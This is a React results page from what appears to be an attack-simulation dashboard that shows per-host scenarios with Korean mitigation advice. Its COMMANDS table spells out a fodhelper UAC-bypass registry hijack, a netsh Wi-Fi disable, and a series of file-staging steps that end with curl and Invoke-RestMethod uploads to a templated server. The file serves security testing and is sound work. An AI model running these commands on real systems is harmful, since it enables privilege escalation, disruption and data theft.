import React, { useEffect, useContext, useState } from 'react';
import { UserContext } from '../../core/user';
import { Typography, Box, Paper, Divider, IconButton, CircularProgress, Button } from '@mui/material';
import { ExpandMore, ExpandLess } from '@mui/icons-material';
import ResultMap from './module/ResultMap';
import { fetchAgents, fetchgetTest } from '../../services/AgentServices';
import { fetchCVEResult, fetchCVERecord, } from '../../services/UserServices';

import mac from '../../static/images/mac.png';
import windows from '../../static/images/windows.png';
import linux from '../../static/images/linux.png';

import ResultDetailDialog from './module/ResultDetail';

const ATTACK_SCENARIOS = {
    wifi_dos: ['Bypass UAC By fodhelper.exe', 'Disrupt WIFI'],
    steal_file_windows: ['Create staging directory', 'Find files', 'Stage sensitive files', 'Compress staged directory', 'Exfil staged directory'],
    steal_file_linux: ['Create staging directory', 'Find files', 'Stage sensitive files', 'Compress staged directory', 'Exfil staged directory'],
    cve_linux: ['T1068', 'T1543', 'T1547', 'T1059', 'T1203']
};

const MITIGATION = {
    wifi_dos: ['Bypass UAC By fodhelper.exe 공격은 Fodhelper의 취약점을 이용하여 사용자 계정 컨트롤을 우회해서 관리자 권한을 획득하는 공격입니다. 백신을 설치하거나, OS 업데이트를 통해 대처할 수 있습니다.','Disrupt WIFI 공격은 공격자가 피해자의 WIFI 연결을 끊는 공격입니다. 이 공격을 방지하기 위해서는 WIFI 비밀번호를 변경하거나, WIFI 연결을 끊는 공격을 감지하는 방화벽을 설치해야 합니다. (복구 : 관리자 권한 powershell에 netsh interface set interface name="Wi-Fi" admin=ENABLED 명령어를 입력하여 WIFI를 다시 활성화합니다.)'],
    steal_file_windows: ['Create staging directory 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 저장할 디렉토리를 생성하는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.','Find files 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 찾는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.','Stage sensitive files 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 저장하는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.','Compress staged directory 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 압축하는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.','Exfil staged directory 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 전송하는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.'],
    steal_file_linux: ['Create staging directory 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 저장할 디렉토리를 생성하는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.','Find files 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 찾는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.','Stage sensitive files 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 저장하는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.','Compress staged directory 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 압축하는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.','Exfil staged directory 공격은 공격자가 피해자의 파일을 탈취하기 위해 파일을 전송하는 공격입니다. 이 공격을 방지하기 위해서는 파일을 저장할 디렉토리에 대한 접근 권한을 제한하거나, 파일을 저장할 디렉토리에 대한 감시 시스템을 설치해야 합니다.'],
    cve_linux: ['Linux 커널 버전 3.15 ~ 6.1.76 / 6.2 ~ 6.6.15 / 6.7 ~ 6.7.3을 사용하는 경우 커널을 최신 버전으로 업데이트합니다.']
}

const SCENARIO_DETAIL = {
    wifi_dos: 'Wifi DoS 공격은 공격자가 피해자의 WIFI 모듈을 망가뜨리는 공격입니다.',
    steal_file_windows: 'Steal Sensitive File 공격 시나리오는 공격자가 피해자의 파일을 탈취하는 공격입니다.',
    steal_file_linux: 'Steal Sensitive File 공격 시나리오는 공격자가 피해자의 파일을 탈취하는 공격입니다.',
    cve_linux: 'CVE-2024-1086은 Linux 특정 커널 버전에 해당하는 User-After-Free 취약점으로, 공격자가 피해자의 시스템을 제어할 수 있는 취약점입니다.'
};

const COMMANDS = {
    wifi_dos: [`reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f ; reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f ; fodhelper.exe`, `netsh interface set interface name="Wi-Fi" admin=DISABLED`],
    steal_file_windows: ['New-Item -Path . -Name "staged" -ItemType "Directory" -Force $PWD.Path + "\staged"', "Get-ChildItem -Path C:\Users\User -Filter *.pdf -Recurse |     Where-Object { $_.Length -le 512KB -and $_.FullName -notmatch '\\\.' } |    Select-Object -First 5 |     ForEach-Object { $_.FullName }", 'Copy-Item -Path ")]}" -Destination "#{host.dir.staged[filters(max=1)]}" -Force', 'Compress-Archive -Path "C:\Users\User\staged\" -DestinationPath "C:\Users\User\staged.zip"', 'Invoke-RestMethod -Uri "#{server}/file/upload" -Method Post -InFile "C:\Users\User\staged.zip" -ContentType "multipart/form-data" -Headers @{ "X-Request-ID" = "test0116" }' ],
    steal_file_linux: [`mkdir -p staged && echo $PWD/staged`, `find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5`, `cp "#{host.file.path[filters(technique=T1005,max=3)]}" #{host.dir.staged[filters(max=1)]}`, `tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz`, `curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: 'hostname'-#{paw}" #{server}/file/upload`],
    cve_linux: ['','','','','']
}


const Result = () => {
    const [hostnames, setHostnames] = useState([]);
    const [expandedHostnames, setExpandedHostnames] = useState({});
    const [dialogOpen, setDialogOpen] = useState(false);
    const { userState } = useContext(UserContext);
    const [attack, setAttack] = useState([]);
    const [mitigation, setMitigation] = useState([]);
    const [scenarioDetail, setScenarioDetail] = useState([]);
    const [commands, setCommands] = useState([]);
    const [linux_, setLinux_] = useState(false);

    const [tmpde, setTmpde] = useState(null);

    const fetchData = (uid) => {
        fetchAgents(uid)
            .then(response => response.json())
            .then(data => {
                setHostnames(data);
            })
            .catch(error => {
                console.error('Error fetching hostnames:', error);
            });
    };

    useEffect(() => {
        fetchData(userState.uid);
    }, [userState]);

    useEffect(() => {
        fetchgetTest(userState.uid)
            .then(response => response.json())
            .then(data => {
                setTmpde(data.message);
            })
            .catch(error => {
                console.error('Error fetching hostnames:', error);
            });
    },[]);

    const handleToggle = (index) => {
        setExpandedHostnames(prevState => ({
            ...prevState,
            [index]: !prevState[index]  // Toggle the expanded state
        }));
    };

    const handleDialogOpen = (attacks, mitigations, scenario, command, linuxa) => {
        setAttack(attacks)
        setMitigation(mitigations)
        setScenarioDetail(scenario)
        setCommands(command)
        setLinux_(linuxa);
        setDialogOpen(true);
    };

    const handleDialogClose = () => {
        setDialogOpen(false);
    };

    let rid = 1;

    const loadCVEResult = () => {
        if (userState && userState.uid) {

            fetchCVEResult(rid).then((response) => {
                if (response.ok) {
                    response.json().then((data) => {
                        console.log("cve:", data);
                    });
                } else {
                    console.error('cve result load error!');
                }
            });

            fetchCVERecord(rid).then((response) => {
                if (response.ok) {
                    response.json().then((data) => {
                        console.log("detailed cve:", data);
                    });
                } else {
                    console.error('detailed cve result load error!');
                }
            });   
        }
        else console.warn('User state or user UID is not available');
    }

    useEffect(() => {
        loadCVEResult();
    }
    , []);

    return (
        <Box
            sx={{
                p: 4,
                backgroundColor: '#f5f5f5',
                minHeight: '100vh',
                display: 'flex',
                flexDirection: 'column',
            }}
        >
            {hostnames && hostnames.length > 0 ? hostnames.map((hostname, index) => (
                <Paper
                    key={index}
                    elevation={3}
                    sx={{
                        p: 4,
                        width: '100%',
                        textAlign: 'center',
                        backgroundColor: '#ffffff',
                        borderRadius: '15px',
                        mb: 3
                    }}
                >
                    <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer' }}
                        onClick={() => handleToggle(index)}
                    >
                        <Typography variant='h6' sx={{ fontWeight: 'bold', color: '#555555' }}>
                            {hostname.os.toLowerCase().includes('windows') && (
                                <img src={windows} alt='windows' style={{ width: '30px', height: '30px' }} />
                            )}
                            {hostname.os.toLowerCase().includes('linux') && (
                                <img src={linux} alt='linux' style={{ width: '30px', height: '30px' }} />
                            )}
                            {hostname.os.toLowerCase().includes('mac') && (
                                <img src={mac} alt='mac' style={{ width: '40px', height: '40px' }} />
                            )}
                            HOSTNAME: {hostname.hostname}
                        </Typography>
                        
                        <IconButton>
                            {!expandedHostnames[index] ? <ExpandLess /> : <ExpandMore />}
                        </IconButton>
                    </Box>
                    {!expandedHostnames[index] && (
                        <>
                            <Divider sx={{ my: 2 }} />
                            {hostname.os.toLowerCase().includes('windows') && (
                                <>
                                    <Typography variant='h6' sx={{ fontWeight: 'bold', textAlign: 'left' }}>
                                        ATTACK SCENARIO: WIFI DOS
                                    </Typography>
                                    <ResultMap ATTACK_SCENARIO={ATTACK_SCENARIOS.wifi_dos} />
                                    <Button
                                        variant="outlined"
                                        sx={{ mt: 2 }}
                                        onClick={() => handleDialogOpen(ATTACK_SCENARIOS.wifi_dos, MITIGATION.wifi_dos, SCENARIO_DETAIL.wifi_dos, COMMANDS.wifi_dos)}
                                    >
                                        View Detail
                                    </Button>
                                    <Divider sx={{ my: 2 }} />
                                </>
                            )}
                            {hostname.os.toLowerCase().includes('windows') && (
                                <>
                                    <Typography variant='h6' sx={{ fontWeight: 'bold', textAlign: 'left' }}>
                                        ATTACK SCENARIO: Steal Sensitive File
                                    </Typography>
                                    <ResultMap ATTACK_SCENARIO={ATTACK_SCENARIOS.steal_file_windows} />
                                    <Button
                                        variant="outlined"
                                        sx={{ mt: 2 }}
                                        onClick={() => handleDialogOpen(ATTACK_SCENARIOS.steal_file_windows, MITIGATION.steal_file_windows, SCENARIO_DETAIL.steal_file_windows, COMMANDS.steal_file_windows)}
                                    >
                                        View Detail
                                    </Button>
                                    <Divider sx={{ my: 2 }} />
                                </>
                            )}
                            {hostname.os.toLowerCase().includes('linux')  && tmpde && (
                                <>
                                    <Typography variant='h6' sx={{ fontWeight: 'bold', textAlign: 'left' }}>
                                        취약점 : CVE-2024-1086 / User-After-Free Vulnerability
                                    </Typography>
                                    <ResultMap ATTACK_SCENARIO={ATTACK_SCENARIOS.cve_linux} />
                                    <Button
                                        variant="outlined"
                                        sx={{ mt: 2 }}
                                        onClick={() => handleDialogOpen(ATTACK_SCENARIOS.cve_linux, MITIGATION.cve_linux, SCENARIO_DETAIL.cve_linux, COMMANDS.cve_linux, true)}
                                    >
                                        View Detail
                                    </Button>
                                    <Divider sx={{ my: 2 }} />
                                
                                    {/* <Typography variant='h6' sx={{ fontWeight: 'bold', textAlign: 'left' }}>
                                        ATTACK SCENARIO: Steal Sensitive File
                                    </Typography>
                                    <ResultMap ATTACK_SCENARIO={ATTACK_SCENARIOS.steal_file_linux} />
                                    <Button
                                        variant="outlined"
                                        sx={{ mt: 2 }}
                                        onClick={() => handleDialogOpen(ATTACK_SCENARIOS.steal_file_linux, MITIGATION.steal_file_linux, SCENARIO_DETAIL.steal_file_linux, COMMANDS.steal_file_linux)}
                                    >
                                        View Detail
                                    </Button>
                                    <Divider sx={{ my: 2 }} /> */}
                                </>
                            )}
                        </>
                    )}
                </Paper>
            )) : (
                <Typography variant='h6' sx={{ color: '#555555' }}>
                    Loading... <CircularProgress size={20} />
                </Typography>
            )}
            <ResultDetailDialog
                open={dialogOpen}
                onClose={handleDialogClose}
                attacks={attack}
                mitigation={mitigation}
                scenario={scenarioDetail}
                commands={commands}
                linux={linux_}
            />
        </Box>
    );
};

export default Result;

